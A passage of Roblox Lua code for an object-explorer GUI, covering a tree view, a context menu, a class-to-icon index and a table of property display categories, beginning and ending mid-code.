		scrollOverlayFrame.MouseWheelForward:Connect(function()newMt:ScrollTo(newMt.Index - wheelIncrement)end)
		scrollOverlayFrame.MouseWheelBackward:Connect(function()newMt:ScrollTo(newMt.Index + wheelIncrement)end)
		
		local scrollUpEvent,scrollDownEvent
		
		local function setScrollFrame(self,frame,inc)
			wheelIncrement = inc or self.Increment
			if scrollUpEvent then scrollUpEvent:Disconnect() scrollUpEvent = nil end
			if scrollDownEvent then scrollDownEvent:Disconnect() scrollDownEvent = nil end
			scrollUpEvent = frame.MouseWheelForward:Connect(function()newMt:ScrollTo(newMt.Index - wheelIncrement)end)
			scrollDownEvent = frame.MouseWheelBackward:Connect(function()newMt:ScrollTo(newMt.Index + wheelIncrement)end)
			--scrollOverlay.Parent = frame
		end
		newMt.SetScrollFrame = setScrollFrame
		
		newMt.Update = update
		
		update()
		return newMt
	end
end

local TreeView do
	TreeView = {}
	
	local treeMt = {
		__index = {
			Length = function(self)
				return #self.Tree
			end
		}
	}
	
	function TreeView.new()
		local function createDNodeTemplate()
			local DNodeTemplate = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=false,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.37647062540054,0.54901963472366,0.82745105028152),BackgroundTransparency=1,BorderColor3=Color3.new(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,1,0,2),Rotation=0,Selectable=true,Size=UDim2.new(1,-18,0,18),SizeConstraint=0,Visible=true,ZIndex=1,Name="Entry",})
			local DNodeTemplate2 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0,0,0),BackgroundTransparency=1,BorderColor3=Color3.new(0.14509804546833,0.20784315466881,0.21176472306252),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,18,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-18,1,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Indent",Parent = DNodeTemplate})
			local DNodeTemplate3 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Item",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,22,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-22,0,18),SizeConstraint=0,Visible=true,ZIndex=1,Name="EntryName",Parent = DNodeTemplate2})
			local DNodeTemplate4 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,2,0.5,-8),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=true,ZIndex=1,Name="IconFrame",Parent = DNodeTemplate2})
			local DNodeTemplate5 = CreateInstance("ImageLabel",{Image="rbxassetid://529659138",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-5.811999797821,0,-1.3120000362396,0),Rotation=0,Selectable=false,Size=UDim2.new(16,0,16,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Icon",Parent = DNodeTemplate4})
			local DNodeTemplate6 = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=true,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,-16,0.5,-8),Rotation=0,Selectable=true,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=true,ZIndex=1,Name="Expand",Parent = DNodeTemplate2})
			local DNodeTemplate7 = CreateInstance("ImageLabel",{Image="rbxassetid://529659138",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(-12.562000274658,0,-12.562000274658,0),Rotation=0,Selectable=false,Size=UDim2.new(16,0,16,0),SizeConstraint=0,Visible=true,ZIndex=1,Name="Icon",Parent = DNodeTemplate6})
			return DNodeTemplate
		end
		local dNodeTemplate = createDNodeTemplate()		
		
		local newMt = setmetatable({
			Index = 0,
			Tree = {},
			Expanded = {},
			NodeTemplate = dNodeTemplate,
			DisplayFrame = nil,
			Entries = {},
			Height = 18,
			OffX = 1,
			OffY = 1
		},treeMt)
		
		local function refresh(self)
			if not self.DisplayFrame then warn("Tree: No Display Frame") return end
			
			if self.PreUpdate then self:PreUpdate() end
			
			local displayFrame = self.DisplayFrame
			local entrySpace = math.ceil(displayFrame.AbsoluteSize.Y / (self.Height + 1))
			
			for i = 1,entrySpace do
				local node = self.Tree[i + self.Index]
				if node then
					local entry = self.Entries[i]
					if not entry then
						entry = self.NodeTemplate:Clone()
						entry.Position = UDim2.new(0,self.OffX,0,self.OffY + (self.Height + 1) * #displayFrame:GetChildren())
						entry.Parent = displayFrame
						self.Entries[i] = entry
						if self.NodeCreate then self:NodeCreate(entry,i) end
					end
					entry.Visible = true
					if self.NodeDraw then self:NodeDraw(entry,node) end
				else
					local entry = self.Entries[i]
					if entry then
						entry.Visible = false
					end
				end
			end
			
			for i = entrySpace+1,#self.Entries do
				if self.Entries[i] then
					self.Entries[i]:Destroy()
					self.Entries[i] = nil
				end
			end
			
			if self.OnUpdate then self:OnUpdate() end
			if self.RefreshNeeded then self.RefreshNeeded = false self:Refresh() end
		end
		newMt.Refresh = refresh
		
		local function expand(self,item)
			self.Expanded[item] = not self.Expanded[item]
			if self.TreeUpdate then self:TreeUpdate() end
			self:Refresh()
		end
		newMt.Expand = expand
		
		local Selection do
			Selection = {
				List = {},
				Selected = {}
			}
	
			function Selection:Add(obj)
				if Selection.Selected[obj] then return end
		
				Selection.Selected[obj] = true
				table.insert(Selection.List,obj)
			end
	
			function Selection:Set(objs)
				for i,v in pairs(Selection.List) do
					Selection.Selected[v] = nil
				end
				Selection.List = {}
		
				for i,v in pairs(objs) do
					if not Selection.Selected[v] then
						Selection.Selected[v] = true
						table.insert(Selection.List,v)
					end
				end
			end
	
			function Selection:Remove(obj)
				if not Selection.Selected[obj] then return end
		
				Selection.Selected[obj] = false
				for i,v in pairs(Selection.List) do
					if v == obj then table.remove(Selection.List,i) break end
				end
			end
		end
		newMt.Selection = Selection
		
		return newMt
	end
end

local ContextMenu do
	ContextMenu = {}
	
	local function createContextEntry()
		local ContextEntry = CreateInstance("TextButton",{Font=3,FontSize=5,Text="",TextColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=2,TextYAlignment=1,AutoButtonColor=false,Modal=false,Selected=false,Style=0,Active=true,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.37647062540054,0.54901963472366,0.82745105028152),BackgroundTransparency=1,BorderColor3=Color3.new(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,2),Rotation=0,Selectable=true,Size=UDim2.new(1,0,0,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Entry",})
		local ContextEntry2 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,2,0.5,-8),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=true,ZIndex=1,Name="IconFrame",Parent = ContextEntry})
		local ContextEntry3 = CreateInstance("ImageLabel",{Image="rbxassetid://529659138",ImageColor3=Color3.new(1,1,1),ImageRectOffset=Vector2.new(0,0),ImageRectSize=Vector2.new(0,0),ImageTransparency=0,ScaleType=0,SliceCenter=Rect.new(0,0,0,0),Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=false,Size=UDim2.new(0,16,0,16),SizeConstraint=0,Visible=true,ZIndex=1,Name="Icon",Parent = ContextEntry2})
		local ContextEntry4 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Item",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=0,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,24,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-24,0,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="EntryName",Parent = ContextEntry})
		local ContextEntry5 = CreateInstance("TextLabel",{Font=3,FontSize=5,Text="Ctrl+C",TextColor3=Color3.new(0.86274516582489,0.86274516582489,0.86274516582489),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0,0,0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=1,TextYAlignment=1,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,24,0,0),Rotation=0,Selectable=false,Size=UDim2.new(1,-30,0,20),SizeConstraint=0,Visible=true,ZIndex=1,Name="Shortcut",Parent = ContextEntry})
		return ContextEntry
	end
	
	local function createContextDivider()
		local ContextDivider = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.18823531270027,0.18823531270027,0.18823531270027),BackgroundTransparency=1,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,0,0,20),Rotation=0,Selectable=false,Size=UDim2.new(1,0,0,12),SizeConstraint=0,Visible=true,ZIndex=1,Name="Divider",})
		local ContextDivider2 = CreateInstance("Frame",{Style=0,Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.43921571969986,0.43921571969986,0.43921571969986),BackgroundTransparency=0,BorderColor3=Color3.new(0.10588236153126,0.16470588743687,0.20784315466881),BorderSizePixel=0,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0,2,0,5),Rotation=0,Selectable=false,Size=UDim2.new(1,-4,0,1),SizeConstraint=0,Visible=true,ZIndex=1,Name="Line",Parent = ContextDivider})
		return ContextDivider
	end
	
	local contextFrame = CreateInstance("ScrollingFrame",{BottomImage="rbxasset://textures/ui/Scroll/scroll-bottom.png",CanvasPosition=Vector2.new(0,0),CanvasSize=UDim2.new(0,0,2,0),MidImage="rbxasset://textures/ui/Scroll/scroll-middle.png",ScrollBarThickness=0,ScrollingEnabled=true,TopImage="rbxasset://textures/ui/Scroll/scroll-top.png",Active=false,AnchorPoint=Vector2.new(0,0),BackgroundColor3=Color3.new(0.3137255012989,0.3137255012989,0.3137255012989),BackgroundTransparency=0,BorderColor3=Color3.new(0.43921571969986,0.43921571969986,0.43921571969986),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0,0,0,0),Rotation=0,Selectable=true,Size=UDim2.new(0,200,0,100),SizeConstraint=0,Visible=true,ZIndex=1,Name="ContextFrame",})
	local contextEntry = createContextEntry()
	local contextDivider = createContextDivider()
	
	function ContextMenu.new()
		local newMt = setmetatable({
			Width = 200,
			Height = 20,
			Items = {},
			Frame = contextFrame:Clone()
		},{})
		
		local mainFrame = newMt.Frame
		local entryFrame = contextEntry:Clone()
		local dividerFrame = contextDivider:Clone()
		
		mainFrame.ScrollingEnabled = false
		
		local function add(self,item)
			local newItem = {
				Name = item.Name or "Item",
				Icon = item.Icon or "",
				Shortcut = item.Shortcut or "",
				OnClick = item.OnClick,
				OnHover = item.OnHover,
				Disabled = item.Disabled or false,
				DisabledIcon = item.DisabledIcon or ""
			}
			table.insert(self.Items,newItem)
		end
		newMt.Add = add
		
		local function addDivider(self)
			table.insert(self.Items,"Divider")
		end
		newMt.AddDivider = addDivider
		
		local function clear(self)
			self.Items = {}
		end
		newMt.Clear = clear
		
		local function refresh(self)
			mainFrame:ClearAllChildren()
			
			local currentPos = 2
			for _,item in pairs(self.Items) do
				if item == "Divider" then
					local newDivider = dividerFrame:Clone()
					newDivider.Position = UDim2.new(0,0,0,currentPos)
					newDivider.Parent = mainFrame
					currentPos = currentPos + 12
				else
					local newEntry = entryFrame:Clone()
					newEntry.Position = UDim2.new(0,0,0,currentPos)
					newEntry.EntryName.Text = item.Name
					newEntry.Shortcut.Text = item.Shortcut
					if item.Disabled then
						newEntry.EntryName.TextColor3 = Color3.new(150/255,150/255,150/255)
						newEntry.Shortcut.TextColor3 = Color3.new(150/255,150/255,150/255)
					end
					
					local useIcon = item.Disabled and item.DisabledIcon or item.Icon
					if type(useIcon) == "string" then
						newEntry.IconFrame.Icon.Image = useIcon
					else
						newEntry.IconFrame:Destroy()
						local newIcon = useIcon:Clone()
						newIcon.Position = UDim2.new(0,2,0.5,-8)
						newIcon.Parent = newEntry
					end
					
					if item.OnClick and not item.Disabled then newEntry.MouseButton1Click:Connect(item.OnClick) end
					
					newEntry.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							newEntry.BackgroundTransparency = 0.5
						end
					end)
					
					newEntry.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							newEntry.BackgroundTransparency = 1
						end
					end)
					
					newEntry.Parent = mainFrame
					currentPos = currentPos + self.Height
				end
			end
			
			mainFrame.Size = UDim2.new(0,self.Width,0,currentPos+2)
		end
		newMt.Refresh = refresh
		
		local function show(self,displayFrame,x,y)
			local toSize = mainFrame.Size.Y.Offset
			local reverseY = false
			
			local maxX,maxY = gui.AbsoluteSize.X,gui.AbsoluteSize.Y
			
			if x + self.Width > maxX then x = x - self.Width end
			if y + toSize > maxY then reverseY = true end
			
			mainFrame.Position = UDim2.new(0,x,0,y)
			mainFrame.Size = UDim2.new(0,self.Width,0,0)
			mainFrame.Parent = displayFrame
			
			local closeEvent = Services.UserInputService.InputBegan:Connect(function(input)
				if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
				
				if not f.checkMouseInGui(mainFrame) then
					self:Hide()
				end
			end)
			
			if reverseY then
				if y - toSize < 0 then y = toSize end
				mainFrame:TweenSizeAndPosition(UDim2.new(0,self.Width,0,toSize),UDim2.new(0,x,0,y - toSize),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.2,true)
			else
				mainFrame:TweenSize(UDim2.new(0,self.Width,0,toSize),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.2,true)
			end
		end
		newMt.Show = show
		
		local function hide(self)
			mainFrame.Parent = nil
		end
		newMt.Hide = hide
		
		return newMt
	end
end

-- Explorer
local workspaces = {
	["Default"] = {
		Data = {"Default"},
		IsDefault = true
	}
}
local nodes = {}

local explorerPanel
local propertiesPanel

local entryTemplate = resources:WaitForChild("Entry")

local iconMap = "rbxassetid://765660635"
local iconIndex = {
	-- Core
	NodeCollapsed = 165;
	NodeExpanded = 166;
	NodeCollapsedOver = 179;
	NodeExpandedOver = 180;
	
	-- Buttons
	CUT_ICON = 174;
	COPY_ICON = 175;
	PASTE_ICON = 176;
	DELETE_ICON = 177;
	GROUP_ICON = 150;
	UNGROUP_ICON = 151;
	SELECTCHILDREN_ICON = 152;
	
	CUT_D_ICON = 160;
	COPY_D_ICON = 161;
	PASTE_D_ICON = 162;
	DELETE_D_ICON = 163;
	GROUP_D_ICON = 136;
	UNGROUP_D_ICON = 137;
	SELECTCHILDREN_D_ICON = 138;
	
	-- Classes
	["Accessory"] = 32;
	["Accoutrement"] = 32;
	["AdvancedDragger"] = 41;
	["AdService"] = 73;
	["AlignOrientation"] = 110;
	["AlignPosition"] = 111;
	["Animation"] = 60;
	["AnimationController"] = 60;
	["AnimationTrack"] = 60;
	["Animator"] = 60;
	["ArcHandles"] = 56;
	["AssetService"] = 72;
	["Attachment"] = 92;
	["Backpack"] = 20;
	["BadgeService"] = 75;
	["BallSocketConstraint"] = 97;
	["BillboardGui"] = 64;
	["BinaryStringValue"] = 4;
	["BindableEvent"] = 67;
	["BindableFunction"] = 66;
	["BlockMesh"] = 8;
	["BloomEffect"] = 90;
	["BlurEffect"] = 90;
	["BodyAngularVelocity"] = 14;
	["BodyForce"] = 14;
	["BodyGyro"] = 14;
	["BodyPosition"] = 14;
	["BodyThrust"] = 14;
	["BodyVelocity"] = 14;
	["BoolValue"] = 4;
	["BoxHandleAdornment"] = 54;
	["BrickColorValue"] = 4;
	["Camera"] = 5;
	["CFrameValue"] = 4;
	["ChangeHistoryService"] = 118;
	["CharacterMesh"] = 60;
	["Chat"] = 33;
	["ClickDetector"] = 41;
	["CollectionService"] = 30;
	["Color3Value"] = 4;
	["ColorCorrectionEffect"] = 90;
	["ConeHandleAdornment"] = 54;
	["Configuration"] = 58;
	["ContentProvider"] = 72;
	["ContextActionService"] = 41;
	["ControllerService"] = 84;
	["CookiesService"] = 119;
	["CoreGui"] = 46;
	["CoreScript"] = 91;
	["CornerWedgePart"] = 1;
	["CustomEvent"] = 4;
	["CustomEventReceiver"] = 4;
	["CylinderHandleAdornment"] = 54;
	["CylinderMesh"] = 8;
	["CylindricalConstraint"] = 89;
	["Debris"] = 30;
	["Decal"] = 7;
	["Dialog"] = 62;
	["DialogChoice"] = 63;
	["DoubleConstrainedValue"] = 4;
	["Explosion"] = 36;
	["FileMesh"] = 8;
	["Fire"] = 61;
	["Flag"] = 38;
	["FlagStand"] = 39;
	["FloorWire"] = 4;
	["Folder"] = 70;
	["ForceField"] = 37;
	["Frame"] = 48;
	["FriendService"] = 121;
	["GamepadService"] = 84;
	["GamePassService"] = 19;
	["Geometry"] = 120;
	["Glue"] = 34;
	["GuiButton"] = 52;
	["GuiMain"] = 47;
	["GuiService"] = 47;
	["Handles"] = 53;
	["HapticService"] = 84;
	["Hat"] = 45;
	["HingeConstraint"] = 89;
	["Hint"] = 33;
	["HopperBin"] = 22;
	["HttpRbxApiService"] = 76;
	["HttpService"] = 76;
	["Humanoid"] = 9;
	["HumanoidController"] = 9;
	["ImageButton"] = 52;
	["ImageLabel"] = 49;
	["InsertService"] = 72;
	["IntConstrainedValue"] = 4;
	["IntValue"] = 4;
	["JointInstance"] = 34;
	["JointsService"] = 34;
	["Keyframe"] = 60;
	["KeyframeSequence"] = 60;
	["KeyframeSequenceProvider"] = 60;
	["Lighting"] = 13;
	["LineForce"] = 112;
	["LineHandleAdornment"] = 54;
	["LocalScript"] = 18;
	["LogService"] = 87;
	["LuaWebService"] = 91;
	["MarketplaceService"] = 106;
	["MeshContentProvider"] = 8;
	["MeshPart"] = 77;
	["Message"] = 33;
	["Model"] = 2;
	["ModuleScript"] = 71;
	["Motor"] = 34;
	["Motor6D"] = 34;
	["MoveToConstraint"] = 89;
	["NegateOperation"] = 78;
	["NetworkClient"] = 16;
	["NetworkReplicator"] = 29;
	["NetworkServer"] = 15;
	["NotificationService"] = 117;
	["NumberValue"] = 4;
	["ObjectValue"] = 4;
	["Pants"] = 44;
	["ParallelRampPart"] = 1;
	["Part"] = 1;
	["ParticleEmitter"] = 69;
	["PartPairLasso"] = 57;
	["PathfindingService"] = 37;
	["PersonalServerService"] = 121;
	["PhysicsService"] = 30;
	["Platform"] = 35;
	["Player"] = 12;
	["PlayerGui"] = 46;
	["Players"] = 21;
	["PlayerScripts"] = 82;
	["PointLight"] = 13;
	["PointsService"] = 83;
	["Pose"] = 60;
	["PrismaticConstraint"] = 89;
	["PrismPart"] = 1;
	["PyramidPart"] = 1;
	["RayValue"] = 4;
	["ReflectionMetadata"] = 86;
	["ReflectionMetadataCallbacks"] = 86;
	["ReflectionMetadataClass"] = 86;
	["ReflectionMetadataClasses"] = 86;
	["ReflectionMetadataEnum"] = 86;
	["ReflectionMetadataEnumItem"] = 86;
	["ReflectionMetadataEnums"] = 86;
	["ReflectionMetadataEvents"] = 86;
	["ReflectionMetadataFunctions"] = 86;
	["ReflectionMetadataMember"] = 86;
	["ReflectionMetadataProperties"] = 86;
	["ReflectionMetadataYieldFunctions"] = 86;
	["RemoteEvent"] = 80;
	["RemoteFunction"] = 79;
	["RenderHooksService"] = 122;
	["ReplicatedFirst"] = 72;
	["ReplicatedStorage"] = 72;
	["RightAngleRampPart"] = 1;
	["RocketPropulsion"] = 14;
	["RodConstraint"] = 89;
	["RopeConstraint"] = 89;
	["Rotate"] = 34;
	["RotateP"] = 34;
	["RotateV"] = 34;
	["RunService"] = 124;
	["RuntimeScriptService"] = 91;
	["ScreenGui"] = 47;
	["Script"] = 6;
	["ScriptContext"] = 82;
	["ScriptService"] = 91;
	["ScrollingFrame"] = 48;
	["Seat"] = 35;
	["Selection"] = 55;
	["SelectionBox"] = 54;
	["SelectionPartLasso"] = 57;
	["SelectionPointLasso"] = 57;
	["SelectionSphere"] = 54;
	["ServerScriptService"] = 115;
	["ServerStorage"] = 74;
	["Shirt"] = 43;
	["ShirtGraphic"] = 40;
	["SkateboardPlatform"] = 35;
	["Sky"] = 28;
	["SlidingBallConstraint"] = 89;
	["Smoke"] = 59;
	["Snap"] = 34;
	["SolidModelContentProvider"] = 77;
	["Sound"] = 11;
	["SoundGroup"] = 93;
	["SoundService"] = 31;
	["Sparkles"] = 42;
	["SpawnLocation"] = 25;
	["SpecialMesh"] = 8;
	["SphereHandleAdornment"] = 54;
	["SpotLight"] = 13;
	["SpringConstraint"] = 89;
	["StarterCharacterScripts"] = 82;
	["StarterGear"] = 20;
	["StarterGui"] = 46;
	["StarterPack"] = 20;
	["StarterPlayer"] = 88;
	["StarterPlayerScripts"] = 82;
	["Status"] = 2;
	["StringValue"] = 4;
	["SunRaysEffect"] = 90;
	["SurfaceGui"] = 64;
	["SurfaceLight"] = 13;
	["SurfaceSelection"] = 55;
	["Team"] = 24;
	["Teams"] = 23;
	["TeleportService"] = 81;
	["Terrain"] = 65;
	["TerrainRegion"] = 65;
	["TestService"] = 68;
	["TextBox"] = 51;
	["TextButton"] = 51;
	["TextLabel"] = 50;
	["TextService"] = 50;
	["Texture"] = 10;
	["TextureTrail"] = 4;
	["TimerService"] = 118;
	["Tool"] = 17;
	["Torque"] = 113;
	["TouchInputService"] = 84;
	["TouchTransmitter"] = 37;
	["TrussPart"] = 1;
	["TweenService"] = 109;
	["UnionOperation"] = 77;
	["UserInputService"] = 84;
	["Vector3Value"] = 4;
	["VehicleSeat"] = 35;
	["VelocityMotor"] = 34;
	["Visit"] = 123;
	["VRService"] = 95;
	["WedgePart"] = 1;
	["Weld"] = 34;
	["Workspace"] = 19;
	[""] = 116;
}

entryTemplate.Indent.IconFrame.Icon.Image = iconMap

-- Properties
local propCategories = {
    ["Instance"] = {
        ["Archivable"] = "Behavior",
        ["ClassName"] = "Data",
        ["DataCost"] = "Data",
        ["Name"] = "Data",
        ["Parent"] = "Data",
        ["RobloxLocked"] = "Data"
    },
    ["BasePart"] = {
        ["Anchored"] = "Behavior",
        ["BackParamA"] = "Surface Inputs",
        ["BackParamB"] = "Surface Inputs",
        ["BackSurface"] = "Surface",
        ["BackSurfaceInput"] = "Surface Inputs",
        ["BottomParamA"] = "Surface Inputs",
        ["BottomParamB"] = "Surface Inputs",
        ["BottomSurface"] = "Surface",
        ["BottomSurfaceInput"] = "Surface Inputs",
        ["BrickColor"] = "Appearance",
        ["CFrame"] = "Data",
        ["CanCollide"] = "Behavior",
        ["CollisionGroupId"] = "Data",
        ["CustomPhysicalProperties"] = "Part",
        ["DraggingV1"] = "Behavior",
        ["Elasticity"] = "Part",
        ["Friction"] = "Part",
        ["FrontParamA"] = "Surface Inputs",
        ["FrontParamB"] = "Surface Inputs",
        ["FrontSurface"] = "Surface",
        ["FrontSurfaceInput"] = "Surface Inputs",
        ["LeftParamA"] = "Surface Inputs",
        ["LeftParamB"] = "Surface Inputs",
        ["LeftSurface"] = "Surface",
        ["LeftSurfaceInput"] = "Surface Inputs",
        ["LocalTransparencyModifier"] = "Data",
        ["Locked"] = "Behavior",
        ["Material"] = "Appearance",
        ["NetworkIsSleeping"] = "Data",
        ["NetworkOwnerV3"] = "Data",
        ["NetworkOwnershipRule"] = "Behavior",
        ["NetworkOwnershipRuleBool"] = "Behavior",
        ["Position"] = "Data",
        ["ReceiveAge"] = "Part",
        ["Reflectance"] = "Appearance",
        ["ResizeIncrement"] = "Behavior",
        ["ResizeableFaces"] = "Behavior",
        ["RightParamA"] = "Surface Inputs",
        ["RightParamB"] = "Surface Inputs",
        ["RightSurface"] = "Surface",
        ["RightSurfaceInput"] = "Surface Inputs",
        ["RotVelocity"] = "Data",
        ["Rotation"] = "Data",
        ["Size"] = "Part",
        ["TopParamA"] = "Surface Inputs",
        ["TopParamB"] = "Surface Inputs",
        ["TopSurface"] = "Surface",
        ["TopSurfaceInput"] = "Surface Inputs",
        ["Transparency"] = "Appearance",
        ["Velocity"] = "Data"
    },
    ["Part"] = {
        ["Shape"] = "Part"
    },
    ["Message"] = {
        ["Text"] = "Appearance"
    },
    ["Camera"] = {
        ["CFrame"] = "Data",
        ["CameraSubject"] = "Camera",
        ["CameraType"] = "Camera",
        ["FieldOfView"] = "Data",
        ["Focus"] = "Data",
        ["HeadLocked"] = "Data",
        ["HeadScale"] = "Data",
        ["ViewportSize"] = "Data"
    },
    ["Animation"] = {
        ["AnimationId"] = "Data",
        ["Loop"] = "Data",
        ["Priority"] = "Data"
    },
    ["PVAdornment"] = {
        ["Adornee"] = "Data"
    },
    ["PartAdornment"] = {
        ["Adornee"] = "Data"
    },
    ["Decal"] = {
        ["Color3"] = "Appearance",
        ["LocalTransparencyModifier"] = "Appearance",
        ["Shiny"] = "Appearance",
        ["Specular"] = "Appearance",
        ["Texture"] = "Appearance",
        ["Transparency"] = "Appearance"
    },
    ["Texture"] = {
        ["StudsPerTileU"] = "Appearance",
        ["StudsPerTileV"] = "Appearance"
    },
    ["Feature"] = {
        ["FaceId"] = "Data",
        ["InOut"] = "Data",
        ["LeftRight"] = "Data",
        ["TopBottom"] = "Data"
    },
    ["VelocityMotor"] = {
        ["CurrentAngle"] = "Data",
        ["DesiredAngle"] = "Data",
        ["Hole"] = "Data",
        ["MaxVelocity"] = "Data",
    },
    ["JointInstance"] = {
        ["C0"] = "Data",
        ["C1"] = "Data",
        ["Part0"] = "Data",
        ["Part1"] = "Data"
    },
    ["DynamicRotate"] = {
        ["BaseAngle"] = "Data"
    },
    ["Motor"] = {
        ["CurrentAngle"] = "Data",
        ["DesiredAngle"] = "Data",
        ["MaxVelocity"] = "Data"
    },
    ["Glue"] = {
        ["F0"] = "Data",
        ["F1"] = "Data",
        ["F2"] = "Data",
        ["F3"] = "Data"
    },
    ["ManualSurfaceJointInstance"] = {
        ["Surface0"] = "Data",
        ["Surface1"] = "Data"
    },
    ["Explosion"] = {
        ["BlastPressure"] = "Data",
        ["BlastRadius"] = "Data",
        ["DestroyJointRadiusPercent"] = "Data",
        ["ExplosionType"] = "Data",
        ["Position"] = "Data",
        ["Visible"] = "Data"
    },
    ["Sparkles"] = {
        ["Enabled"] = "Data",
        ["SparkleColor"] = "Data"
    },
    ["Fire"] = {
        ["Color"] = "Data",
        ["Enabled"] = "Data",
        ["Heat"] = "Data",
